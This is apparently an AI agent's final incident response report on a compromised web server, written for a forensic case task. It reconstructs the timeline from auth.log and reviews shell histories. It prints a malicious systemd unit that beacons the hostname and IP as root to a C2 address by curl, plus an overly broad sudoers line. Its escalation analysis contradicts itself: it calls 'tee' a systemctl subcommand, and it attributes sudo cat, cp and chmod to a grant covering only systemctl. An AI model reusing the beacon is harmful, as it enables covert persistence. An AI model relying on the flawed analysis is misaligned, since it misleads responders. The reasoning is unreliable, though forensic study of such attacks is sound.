All 9 claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The host **webserver-prod-02** was compromised on **April 14, 2024 at 03:17 UTC** via a stolen SSH key for the **deploy** service account. An attacker logged in from the known C2 server **185.229.59.103**, exploited a dangerously broad NOPASSWD sudo grant on `systemctl`, and installed a persistent beacon service that phones home to the same C2 IP every 10 minutes. The attack left no trace in any user's shell history — it is visible only through the auth.log sudo audit trail.

## Attack Timeline

| Time (UTC) | Event | Source |
|---|---|---|
| Apr 14 03:17:44 | SSH login as `deploy` from **185.229.59.103** via publickey | auth.log:30 |
| Apr 14 03:18:02 | `sudo cat /etc/passwd` — reconnaissance | auth.log:32 |
| Apr 14 03:18:12 | `sudo cp /tmp/update /usr/local/bin/update` — payload staging | auth.log:35 |
| Apr 14 03:18:17 | `sudo chmod +x /usr/local/bin/update` — made payload executable | auth.log:36 |
| Apr 14 03:18:29 | `sudo tee /etc/systemd/system/system-updater.service` — wrote malicious unit | auth.log:37 |
| Apr 14 03:18:44 | `sudo systemctl daemon-reload` | auth.log:38 |
| Apr 14 03:18:58 | `sudo systemctl enable system-updater.service` — persistence | auth.log:39 |
| Apr 14 03:19:03 | `sudo systemctl start system-updater.service` — beacon activated | auth.log:40 |
| Apr 14 03:20:51 | Session closed | auth.log:41 |

The entire attack took approximately **3 minutes**.

## Initial Access

The attacker authenticated as the `deploy` user via SSH publickey from **185.229.59.103** (confirmed C2 server). The key fingerprint (`RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ`) is identical to the one used in legitimate deploy sessions from the CI runner at 10.0.1.50. There were **zero failed login attempts** — this was a stolen-key compromise, not a brute-force attack. The deploy account has two authorized public keys: `deploy@ci-runner-1` and `deploy@ci-backup`.

## Persistence Mechanism

A malicious systemd unit was installed at `/etc/systemd/system/system-updater.service`:

```ini
[Service]
ExecStart=/usr/bin/curl -sX POST https://185.229.59.103:8443/beacon -d "host=$(hostname)&ip=$(hostname -I)"
Restart=always
RestartSec=600
User=root
```

This service beacons the host's hostname and IP address to the C2 server every 600 seconds, runs as root, and is enabled at boot. The attacker also dropped a binary payload at `/usr/local/bin/update` (copied from `/tmp/update`).

## Privilege Escalation Vector

The deploy account had a dangerous sudoers configuration in `/etc/sudoers.d/deploy`:

```
deploy  ALL=(root) NOPASSWD: /usr/bin/systemctl
```

This grants NOPASSWD sudo access to **any** `systemctl` subcommand — including `enable`, `start`, `daemon-reload`, and `tee` to write arbitrary unit files. This is a well-known privilege escalation vector (systemctl can install rogue services that run as root).

## IOC Summary

| Type | Value | Verdict |
|---|---|---|
| IP | **185.229.59.103** | Confirmed C2 server (tags: c2, beacon) |
| URL | `https://185.229.59.103:8443/beacon` | C2 beacon endpoint |
| File | `/etc/systemd/system/system-updater.service` | Malicious systemd unit |
| File | `/usr/local/bin/update` | Dropped payload |
| SSH key | `RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ` | Compromised deploy key |

## Shell History Analysis

Three accounts had shell history files; one active account (bob) did not:

| Account | History File | Size | Commands | Findings |
|---|---|---|---|---|
| **root** | `root/.bash_history` | 80 bytes | 4 | Benign admin: `apt update`, `apt upgrade`, `systemctl restart nginx`, `tail -f /var/log/nginx/error.log` |
| **deploy** | `home/deploy/.bash_history` | 264 bytes | 15 | Normal CI/CD: `git pull`, `npm ci`, `npm run build`, `npm test`, `git push`. One flagged outbound curl to registry.npmjs.org (benign). **No attacker commands present.** |
| **alice** | `home/alice/.bash_history` | 123 bytes | 6 | Normal log review: `ls`, `cd /var/log`, `tail nginx/access.log`, `journalctl`, `systemctl status nginx` |
| **bob** | *(no file)* | — | — | No `.bash_history` despite two authenticated SSH sessions in the auth log. Bob ran `sudo apt update` and `sudo apt upgrade -y` per auth.log. |

**Key finding:** The attacker's malicious commands do not appear in any shell history file. They are recorded exclusively in the auth.log sudo audit trail (lines 32–40). This suggests the attacker either cleared history, used a non-interactive execution method, or the session was too short for history to flush to disk.

## Case Questions

**Case Q1:** Shell histories were analyzed for **three accounts**: **root**, **deploy**, and **alice**. A fourth account, **bob**, had no `.bash_history` file despite having active SSH logins in the auth log. All three existing history files were examined with `analyze_bash_history` and their full contents were reviewed.

**Case Q2:** **No** — none of the shell histories show what the attacker did. The attacker logged in as the **deploy** account from C2 IP 185.229.59.103, but deploy's `.bash_history` contains only 15 normal CI/CD commands (git pull, npm ci, npm test, etc.) with no trace of the malicious activity. The attacker's actions — reconnaissance (`cat /etc/passwd`), payload staging (`cp /tmp/update`), and persistence installation (`tee` systemd unit, `systemctl enable/start`) — are visible **only** in the auth.log sudo entries (lines 32–40), not in any shell history file.